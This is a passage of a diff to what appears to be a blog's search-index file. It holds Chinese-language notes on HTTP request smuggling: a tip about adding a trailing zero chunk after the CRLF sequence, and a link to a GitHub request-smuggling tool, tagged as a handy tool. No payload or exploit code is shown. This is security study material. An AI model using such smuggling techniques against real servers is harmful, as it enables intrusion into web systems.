+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226142929.png" alt="20241226142929"><br>
+ 需要 \r\n\r\n 在后面加上尾随序列 0。</p>
+<h3 id="请求走私工具"><a class="markdownIt-Anchor" href="#请求走私工具">#</a> 请求走私工具</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求走私工具：https://github.com/anshumanpattnaik/http-request-smuggling</span><br></pre></td></tr></table></figure>
+<p><img src="https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241226143049.png" alt="20241226143049"></p>
+]]></content>
+      <tags>
+        <tag>神兵利器</tag>
       </tags>
   </entry>
 </search>
